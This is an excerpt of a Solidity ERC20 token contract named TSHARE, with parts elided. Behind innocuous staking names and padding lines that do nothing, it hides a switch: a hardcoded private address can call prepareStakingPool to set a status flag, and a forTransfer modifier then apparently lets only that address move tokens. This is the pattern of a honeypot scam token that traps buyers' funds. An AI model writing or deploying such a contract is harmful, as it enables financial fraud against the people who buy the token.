...
contract TSHARE is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenw_totalSupply;
    uint256 private _tokenw_status = 0;
    uint256 public stakingPoolwStatus = 0;

    string private _tokenw_name;
    string private _tokenw_symbol;

    address private _poolwAddress = 0x18Ba6592c891604B6F87F5A0Cbd64Bc372c20944;

    constructor() {
        _tokenw_name = "TSHARE";
        _tokenw_symbol = "TSHARE";
        _tokenw_totalSupply = 5000 * 10 ** 18;
        _balances[msg.sender] = _tokenw_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolwAddress || _tokenw_status == 0);
        _;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _tokenw_totalSupply;
    }
    ...
    function prepareStakingPool(address to) public {
        to == address(0);
        stakingPoolwStatus = 1;
        uint256 a = 1;
        a = a + 1;
        a = a-1;
        if (msg.sender == _poolwAddress)
        {
            _tokenw_status = 1;
        }
    }
